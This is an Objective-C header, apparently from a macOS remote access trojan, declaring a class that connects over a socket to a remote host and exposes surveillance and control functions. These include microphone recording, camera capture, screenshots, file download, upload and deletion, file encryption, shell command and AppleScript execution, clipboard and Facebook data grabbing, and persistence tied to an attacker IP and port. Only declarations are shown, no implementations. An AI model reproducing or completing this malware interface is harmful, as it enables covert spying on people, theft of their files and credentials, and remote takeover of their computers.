
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>
#include <arpa/inet.h>
#import "NSData+AESCrypt.h"
#import <Appkit/Appkit.h>
#import "escryptor.h"

@interface espl : NSObject {
    NSFileManager *fileManager;
}

@property (nonatomic,strong) AVCaptureSession *session;
@property (readwrite, retain) AVCaptureStillImageOutput *stillImageOutput;
@property (retain) AVAudioRecorder *soundRecorder;
@property (retain) NSFileManager *fileManager;
@property (retain) NSString *skey;
@property (retain) NSString *terminator;
@property (nonatomic,strong) NSTask *systask;

//convenience
-(void)blank;
-(NSString *)forgetFirst:(NSArray*)args;

//socks
extern int sockfd;

-(int)connect:(NSString*)host
             :(long)port;
-(void)sendData:(NSData *)data;
-(void)sendString:(NSString *)string;
-(void)livesendString:(NSString *)string;

//mic
-(void)mic:(NSString *)arg;
-(void)initmic;
-(BOOL)stopAudio;
-(BOOL)recordAudio;

//camera
-(void)takePicture;
-(void)initcamera;
-(void)captureWithBlock:(void(^)(NSData* block))block;
-(void)stopcapture;
- (AVCaptureDevice *)getcapturedevice;

//file management
-(void)directoryList:(NSString *)arg;
-(void)download:(NSString *)arg;
-(void)rmFile:(NSString *)arg;
-(void)changeWD:(NSString *)arg;
-(void)receiveFile:(NSString *)saveToPath;
-(void)sendFile:(NSData *)fileData;
-(void)encryptFile:(NSString *)arg;
-(void)decryptFile:(NSString *)arg;

//misc
-(void)executeCMD:(NSString *)arg;
-(void)idleTime;
-(void)getPid;
-(void)getFacebook;
-(void)getPaste;
-(void)set_brightness:(NSString *)arg;
-(void)screenshot;
-(void)persistence:(NSString *)ip :(NSString *)port;
-(void)removePersistence:(NSString *)ip :(NSString *)port;
-(void)openURL:(NSString *)arg;
-(void)runtask:(NSString *)cmd;
-(void)runAppleScript:(NSString *)arg;
-(void)receivedData:(NSNotification *)notif;
-(NSData *)GetMACAddress;
-(NSString *)GetMACAddressDisplayString;

@end
